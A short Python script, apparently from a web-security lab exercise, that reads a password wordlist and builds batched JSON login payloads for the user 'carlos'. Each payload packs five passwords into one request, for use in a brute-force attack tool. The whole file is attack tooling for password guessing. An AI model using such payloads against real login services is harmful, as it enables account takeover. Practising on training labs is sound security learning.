#!/bin/python3

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

# Get list of passwords
passwords = []
with open('../passwords.lst') as f:
	passwords = f.read().splitlines()

# Load multiple passwords into a list
payloads = []
for i in chunks(passwords, 5):
	passwords = [p for p in i]
	payload = {"username": "carlos", "password": passwords}
	payloads.append(payload)

# Write to file (to be used by intruder)
with open('07-generate-payloads.lst', 'w') as f:
	[f.writelines(str(i).replace('\'','"')+'\n') for i in payloads]
